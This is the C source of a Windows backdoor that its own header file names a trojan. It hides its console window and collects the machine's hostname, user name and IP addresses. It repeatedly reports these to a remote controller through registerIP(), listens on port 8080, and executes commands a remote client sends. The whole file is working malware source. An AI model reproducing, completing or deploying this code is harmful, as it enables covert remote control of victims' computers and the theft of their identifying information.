/*
author: Forec
last edit date: 2016/09/16
email: forec@bupt.edu.cn
						LICENSE
Copyright (c) 2015-2017, Forec <forec@bupt.edu.cn>

Permission to use, copy, modify, and/or distribute this code for any
purpose with or without fee is hereby granted, provided that the above
copyright notice and this permission notice appear in all copies.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/

#include "trojan.h"

int main(int argc, char *argv[]){
	HWND  hDos = GetForegroundWindow();
	ShowWindow(hDos, SW_HIDE);	 // hide window

	fd_set rfd;
	u_long ul = 1;
	struct timeval timeout;
	DWORD bufCharCount = 32767;

	char sendBuf[SEND_BUFLEN], recvBuf[RECV_BUFLEN], *pszAddr = NULL;
	char hostName[INFO_BUFLEN] = { 0 },
		 userName[INFO_BUFLEN] = { 0 },
		       ip[INFO_BUFLEN] = { 0 };

	/* init socket */
	int sockLen = sizeof(SOCKADDR);
	SOCKET sockServer, sockClient;
	SOCKADDR_IN addrServer, addrClient;
	WSADATA wsaData; 
	WORD wVersionRequested;

	FD_ZERO(&rfd);
	timeout.tv_sec = 3000;				// wait 3s
	timeout.tv_usec = 0;

	wVersionRequested = MAKEWORD(2, 2); // config windows socket

	while (true){						// loop until socket configured
		int err = WSAStartup(wVersionRequested, &wsaData);
		if (err != 0){
			continue;
		} else if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2){
			WSACleanup();
		} else
			break;
	}

	gethostname(hostName, bufCharCount);
	GetUserName((LPWSTR)userName, &bufCharCount);
	struct hostent *phostinfo = gethostbyname(hostName);
	for (int i = 0; phostinfo != NULL && phostinfo->h_addr_list[i] != NULL; i++){
		pszAddr = inet_ntoa(*(struct in_addr *)phostinfo->h_addr_list[i]);
		strcat_s(ip, INFO_BUFLEN, pszAddr);
	}

	sprintf_s(hostName, "%s\n%s\n%s", hostName, userName, ip);
	while (!registerIP(hostName));	// register host to remote client

	sockServer = socket(AF_INET, SOCK_STREAM, 0);// define socket
	addrServer.sin_addr.S_un.S_addr = inet_addr(pszAddr);
	addrServer.sin_family = AF_INET;
	addrServer.sin_port = htons(8080);

	printf("Server run at IPv4 address %s ...\n", pszAddr);

	bind(sockServer, (SOCKADDR *)&addrServer, sizeof(SOCKADDR));
	listen(sockServer, 1);

	HINSTANCE hInstance;
	hInstance = GetModuleHandle(0);
	DWORD Tid;
	CreateThread(
		NULL,      
		0,          
		ThreadProc, 
		&hInstance, 
		0,          
		&Tid        
		);

	while (true){
		while (true){
			Sleep(1000);
			sockClient = accept(sockServer, (SOCKADDR *)&addrClient, &sockLen);
			if (sockClient != SOCKET_ERROR){
				send_s(sockClient, "200-success", strlen("200-success") + 1);
				FD_SET(sockClient, &rfd);
				break;
			}
		}

		//printf("remote client connected..\n");

		while (true){
			if (FD_ISSET(sockClient, &rfd)){
				memset(recvBuf, 0, sizeof(recvBuf));
				int recvLen = recv_s(sockClient, recvBuf, RECV_BUFLEN);
				if (recvLen == SOCKET_ERROR)
					break;
				dealWithCommand(sendBuf, recvBuf, recvLen, sockClient);
			}
		}

		//printf("remote client disconnected..\n");
	}
	return 0;
}